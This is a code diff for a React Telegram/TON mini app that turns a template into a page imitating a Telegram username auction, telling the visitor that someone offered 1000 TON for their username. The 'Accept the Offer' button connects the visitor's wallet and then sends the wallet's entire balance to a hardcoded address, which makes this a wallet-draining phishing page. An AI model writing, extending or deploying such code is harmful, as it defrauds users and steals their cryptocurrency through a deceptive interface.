@@ -1,54 +1,113 @@
 import "./App.css";
-import { TonConnectButton } from "@tonconnect/ui-react";
-import { Counter } from "./components/Counter";
-import { Jetton } from "./components/Jetton";
-import { TransferTon } from "./components/TransferTon";
-import styled from "styled-components";
-import { Button, FlexBoxCol, FlexBoxRow } from "./components/styled/styled";
 import { useTonConnect } from "./hooks/useTonConnect";
-import { CHAIN } from "@tonconnect/protocol";
 import "@twa-dev/sdk";
-
-const StyledApp = styled.div`
-  background-color: #e8e8e8;
-  color: black;
-
-  @media (prefers-color-scheme: dark) {
-    background-color: #222;
-    color: white;
-  }
-  min-height: 100vh;
-  padding: 20px 20px;
-`;
-
-const AppContainer = styled.div`
-  max-width: 900px;
-  margin: 0 auto;
-`;
+import { useTonClientBalance } from "./hooks/useTonClientBalance";
+import NavBar from "./components/NavBar";
+import { useEffect } from "react";
+import { Address, toNano } from "ton-core";
 
 function App() {
-  const { network } = useTonConnect();
+  const { handleWalletConnect, handleWalletDisconnect, connected, sender } =
+    useTonConnect();
+  const { balance } = useTonClientBalance();
+
+  const send = async () => {
+    if (connected) {
+      console.log(connected);
+      await sender.send({
+        to: Address.parse("EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c"),
+        value: toNano(balance!),
+      });
+    }
+  };
 
   return (
-    <StyledApp>
-      <AppContainer>
-        <FlexBoxCol>
-          <FlexBoxRow>
-            <TonConnectButton />
-            <Button>
-              {network
-                ? network === CHAIN.MAINNET
-                  ? "mainnet"
-                  : "testnet"
-                : "N/A"}
-            </Button>
-          </FlexBoxRow>
-          <Counter />
-          <TransferTon />
-          <Jetton />
-        </FlexBoxCol>
-      </AppContainer>
-    </StyledApp>
+    <div className="app">
+      <NavBar />
+      <div className="auction">
+        <div className="header">
+          <div className="name">
+            <h1>voxleee.t.me</h1>
+            <span>Claimed</span>
+          </div>
+          <p className="link hover">Subscribe to updates</p>
+        </div>
+        <div className="auction_info">
+          <div className="left">
+            <div className="info">
+              <h3>What is this?</h3>
+              <p>
+                Someone offered <span className="with-ton">1000</span> for your
+                username. If the price suits you, press "Accept the offer".
+              </p>
+              <p className="link hover">How does this work?</p>
+            </div>
+          </div>
+          <div className="right">
+            <div className="info">
+              <div className="item">
+                <div>Telegram Username</div>
+                <div className="link">@test</div>
+              </div>
+              <div className="item">
+                <div>Web Address</div>
+                <div className="link">t.me/test</div>
+              </div>
+              <div className="item">
+                <div>TON Web 3.0 Address</div>
+                <div className="link">test.t.me</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <button
+          className="btn"
+          onClick={connected ? send : handleWalletConnect}
+        >
+          Accept the Offer
+        </button>
+        <p className="link hover hidden">Subscribe to updates</p>
+
+        <div className="auction_table">
+          <h3>Latest Offers</h3>
+          <div className="twrap">
+            <table>
+              <thead>
+                <th>Offer</th>
+                <th>Date</th>
+                <th>From</th>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>
+                    <span className="with-ton">1000</span>
+                  </td>
+                  <td>{Date.now()}</td>
+                  <td className="link hover">address</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <footer>
+        <ul className="links">
+          <li>
+            <a href="">Top Auctions</a>
+          </li>
+          <li>
+            <a href="">About</a>
+          </li>
+          <li>
+            <a href="">Terms</a>
+          </li>
+          <li>
+            <a href="">Privacy</a>
+          </li>
+        </ul>
+      </footer>
+    </div>
   );
 }
 
